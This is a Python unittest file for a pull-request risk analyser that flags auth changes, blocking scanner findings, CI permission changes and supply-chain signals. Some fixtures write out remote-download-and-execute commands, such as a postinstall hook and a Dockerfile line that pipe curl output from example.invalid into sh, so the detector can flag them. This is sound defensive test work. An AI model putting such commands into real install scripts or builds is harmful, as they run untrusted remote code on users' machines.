import unittest

from maintainerguard.analysis import analyze_pull_request
from maintainerguard.config import PolicyRule, load_config


def pr(files, title="Example change", body="", labels=None):
    return {
        "schema_version": "1.0",
        "number": 17,
        "title": title,
        "body": body,
        "draft": False,
        "author": {"login": "contributor", "type": "User"},
        "labels": labels or [],
        "files": files,
    }


class AnalysisTests(unittest.TestCase):
    def setUp(self):
        self.config = load_config()

    def test_docs_only_change_is_low_risk_and_evidence_backed(self):
        report = analyze_pull_request(
            pr([{"path": "docs/getting-started.md", "status": "modified", "patch": "+Clarify setup"}]),
            config=self.config,
        )

        self.assertEqual("Low", report.risk_level)
        self.assertEqual("Ready for maintainer review", report.verdict)
        self.assertTrue(report.evidence)
        self.assertTrue(all(reason.evidence_ids for reason in report.reasons))

    def test_auth_change_without_tests_requires_tests_and_security_review(self):
        report = analyze_pull_request(
            pr(
                [
                    {
                        "path": "src/auth/session.py",
                        "status": "modified",
                        "patch": "-validate(token)\n+validate_session(token)",
                    }
                ],
                title="Change session validation",
            ),
            config=self.config,
        )

        self.assertEqual("High", report.risk_level)
        self.assertEqual("Tests required", report.verdict)
        self.assertTrue(report.security_sensitive_areas)
        self.assertEqual(["Authentication and sessions"], [item.category for item in report.security_sensitive_areas])
        self.assertEqual("High", report.test_impact.level)

    def test_critical_scanner_finding_blocks(self):
        scanner = {
            "schema_version": "1.0",
            "scanner": "dependency-check",
            "findings": [
                {
                    "id": "ADV-1",
                    "severity": "critical",
                    "title": "Known advisory in dependency",
                    "description": "The supplied scanner reports a critical advisory.",
                    "dependency": "example-lib@1.0.0",
                    "blocking": True,
                }
            ],
        }
        report = analyze_pull_request(
            pr([{"path": "requirements.txt", "status": "modified", "patch": "+example-lib==1.0.0"}]),
            scanner_inputs=[scanner],
            config=self.config,
        )

        self.assertEqual("Critical", report.risk_level)
        self.assertEqual("Blocked by scanner finding", report.verdict)

    def test_explicit_high_scanner_block_blocks_without_inflating_to_critical(self):
        scanner = {
            "scanner": "secret-scan",
            "findings": [
                {
                    "id": "SECRET-1",
                    "severity": "high",
                    "title": "Possible secret reported by scanner",
                    "blocking": True,
                }
            ],
        }
        report = analyze_pull_request(
            pr([{"path": "tests/fixtures/example.env", "status": "added"}]),
            scanner_inputs=[scanner],
            config=self.config,
        )
        self.assertEqual("High", report.risk_level)
        self.assertEqual("Blocked by scanner finding", report.verdict)

    def test_skip_label_returns_skipped_report(self):
        report = analyze_pull_request(
            pr([{"path": "src/auth.py", "status": "modified"}], labels=["skip-maintainerguard"]),
            config=self.config,
        )
        self.assertTrue(report.skipped)
        self.assertEqual("Not enough information", report.verdict)

    def test_bot_authored_pr_is_analyzed_but_should_not_be_published_by_default(self):
        payload = pr([{"path": "requirements.txt", "status": "modified"}])
        payload["author"] = {"login": "dependency-bot", "type": "Bot"}
        report = analyze_pull_request(payload, config=self.config)
        self.assertFalse(report.skipped)
        self.assertEqual("Medium", report.dependency_impact.level)

    def test_blocking_policy_can_make_report_critical(self):
        config = load_config()
        config.policies = [
            PolicyRule(
                name="Release workflow requires manual review",
                paths=[".github/workflows/**"],
                require="manual_review",
                blocking=True,
                message="A maintainer must review release workflow changes.",
            )
        ]
        report = analyze_pull_request(
            pr([{"path": ".github/workflows/release.yml", "status": "modified"}]),
            config=config,
        )
        self.assertEqual("Critical", report.risk_level)
        self.assertEqual("Changes requested", report.verdict)

    def test_ci_workflow_permissions_use_supply_chain_guidance_not_auth_tests(self):
        report = analyze_pull_request(
            pr(
                [
                    {
                        "path": ".github/workflows/release.yml",
                        "status": "modified",
                        "patch": "-permissions: read-all\n+permissions:\n+  contents: write\n+  id-token: write",
                    }
                ]
            ),
            config=self.config,
        )
        self.assertEqual(["CI, release, and supply chain"], [item.category for item in report.security_sensitive_areas])
        self.assertEqual("None", report.test_impact.level)
        self.assertNotEqual("Tests required", report.verdict)

    def test_install_script_change_is_high_supply_chain_impact(self):
        report = analyze_pull_request(
            pr(
                [
                    {
                        "path": "package.json",
                        "status": "modified",
                        "patch": '+"postinstall": "curl https://example.invalid/install | sh"',
                    }
                ]
            ),
            config=self.config,
        )
        self.assertEqual("High", report.dependency_impact.level)
        self.assertTrue(report.dependency_impact.evidence_ids)

    def test_supply_chain_sensitive_files_are_reported_beyond_dependency_manifests(self):
        report = analyze_pull_request(
            pr(
                [
                    {
                        "path": "Dockerfile",
                        "status": "modified",
                        "patch": "+RUN curl https://example.invalid/install.sh | sh",
                    },
                    {
                        "path": "scripts/release.sh",
                        "status": "modified",
                        "patch": "+python -m build",
                    },
                ]
            ),
            config=self.config,
        )
        self.assertIn("Dockerfile", report.dependency_impact.affected_files)
        self.assertIn("scripts/release.sh", report.dependency_impact.affected_files)
        self.assertEqual("High", report.dependency_impact.level)
        self.assertTrue(any("remote-download" in signal for signal in report.dependency_impact.signals))

    def test_diff_analysis_is_bounded_before_detectors_run(self):
        config = load_config()
        config.privacy.max_diff_characters = 20
        report = analyze_pull_request(
            pr(
                [
                    {
                        "path": "package.json",
                        "status": "modified",
                        "patch": "+normal-change\n" + ("x" * 50) + '\n+"postinstall": "curl bad"',
                    }
                ]
            ),
            config=config,
        )
        self.assertEqual("Medium", report.dependency_impact.level)
        self.assertTrue(any("diff input was truncated" in item for item in report.limitations))

    def test_dependency_analyzer_describes_version_update(self):
        report = analyze_pull_request(
            pr(
                [
                    {
                        "path": "requirements.txt",
                        "status": "modified",
                        "patch": "-example-lib==1.0.0\n+example-lib==1.2.0",
                    }
                ]
            ),
            config=self.config,
        )
        self.assertIn("Upgraded example-lib from 1.0.0 to 1.2.0.", report.dependency_impact.signals)

    def test_dependency_analyzer_describes_version_downgrade(self):
        report = analyze_pull_request(
            pr(
                [
                    {
                        "path": "requirements.txt",
                        "status": "modified",
                        "patch": "-example-lib==2.0.0\n+example-lib==1.5.0",
                    }
                ]
            ),
            config=self.config,
        )
        self.assertIn("Downgraded example-lib from 2.0.0 to 1.5.0.", report.dependency_impact.signals)


if __name__ == "__main__":
    unittest.main()
